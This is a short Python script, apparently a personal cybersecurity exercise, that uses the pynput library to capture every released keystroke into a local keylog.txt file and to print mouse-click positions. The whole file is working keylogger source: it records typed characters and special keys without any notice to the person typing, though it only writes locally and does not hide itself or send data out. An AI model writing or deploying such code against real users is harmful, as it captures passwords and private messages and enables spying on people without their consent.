from pynput import keyboard
from pynput import mouse

def on_key_release(key):
    with open("/Users/prayudgurung/Desktop/CyberSecurity/Keylogger/keylog.txt", "a") as file:
        try:
            file.write(key.char)
            print("presed",key.char)
        except AttributeError:
            file.write("[" + str(key) + "]")
            print("released", str(key))

def on_mouse_click(x, y, button, pressed):
    if pressed:
        with open("/Users/prayudgurung/Desktop/CyberSecurity/Keylogger/keylog.txt", "a") as file:
            pass
        print(f"🖱️ Mouse clicked: {button} at ({x}, {y})")

keyboardListener = keyboard.Listener(on_release=on_key_release)
mouseListener = mouse.Listener(on_click=on_mouse_click)
keyboardListener.start()
mouseListener.start()
keyboardListener.join()